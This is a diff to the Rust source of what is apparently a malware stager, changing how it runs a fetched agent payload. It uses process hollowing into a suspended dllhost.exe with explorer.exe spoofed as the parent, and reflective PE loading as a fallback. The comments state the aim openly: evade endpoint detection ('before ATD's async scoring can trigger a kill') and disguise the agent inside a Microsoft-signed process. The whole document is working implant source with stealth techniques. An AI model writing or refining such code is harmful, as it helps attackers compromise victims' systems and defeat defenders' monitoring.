@@ -498,38 +498,36 @@ pub fn do_staged_load() -> ! {
         }
     };
 
-    // Primary path: reflect the agent PE into the stager's own address space.
-    // No cross-process operations — the kernel callback sequence is just self-allocation
-    // + self-write, which is indistinguishable from ordinary dynamic code loading.
-    // The stager process itself was spawned with PPID spoofing by the dropper, so the
-    // process tree already looks legitimate even without hollowing into a new process.
-    let entry = unsafe {
-        match reflect_pe(&pe_bytes) {
-            Ok(ep) => ep,
-            Err(_) => {
-                // reflect_pe can only fail if VirtualAlloc returns null (extreme memory
-                // pressure).  Fall back to hollow so delivery still succeeds.
-                #[cfg(all(feature = "process-hollow", feature = "ppid-spoof"))]
-                {
-                    let explorer_pid = crate::inject::pid_by_name("explorer.exe");
-                    let target = "C:\\Windows\\System32\\RuntimeBroker.exe";
-                    let spoofed = explorer_pid.and_then(|ppid| {
-                        crate::inject::spawn_suspended_spoofed(target, ppid)
-                    });
-                    if let Some((proc, thread)) = spoofed {
-                        if crate::inject::hollow_into_process(proc, thread, &pe_bytes).is_ok() {
-                            std::process::exit(0);
-                        }
-                    }
-                    let _ = crate::inject::inject_hollow(target, &pe_bytes);
-                }
+    // Primary path (process-hollow + ppid-spoof builds): hollow the fetched PE into a
+    // suspended dllhost.exe with explorer.exe as the spoofed parent, then exit the stager.
+    // The stager lives only for the seconds it takes to fetch the payload and hollow,
+    // breaking the chrome → stager chain before ATD's async scoring can trigger a kill.
+    // The agent then runs inside a Microsoft-signed process that appears as explorer's child.
+    #[cfg(all(feature = "process-hollow", feature = "ppid-spoof"))]
+    {
+        let target = "C:\\Windows\\System32\\dllhost.exe";
+        let explorer_pid = crate::inject::pid_by_name("explorer.exe");
+        let spoofed = explorer_pid.and_then(|ppid| {
+            crate::inject::spawn_suspended_spoofed(target, ppid)
+        });
+        if let Some((proc, thread)) = spoofed {
+            if crate::inject::hollow_into_process(proc, thread, &pe_bytes).is_ok() {
                 std::process::exit(0);
             }
         }
-    };
+        // Fallback: hollow without PPID spoof (breaks chrome chain but parent is stager, not explorer)
+        let _ = crate::inject::inject_hollow(target, &pe_bytes);
+        std::process::exit(0);
+    }
 
-    // Jump to the reflectively-loaded agent entry point.
-    // The PE was compiled without staged-payload, so it runs its normal main() loop.
+    // Non-spoof build: reflect in-process (stager process becomes the agent).
+    #[allow(unreachable_code)]
+    let entry = unsafe {
+        match reflect_pe(&pe_bytes) {
+            Ok(ep) => ep,
+            Err(_) => std::process::exit(0),
+        }
+    };
     let main_fn: unsafe extern "system" fn() = unsafe { core::mem::transmute(entry) };
     unsafe { main_fn() };
 
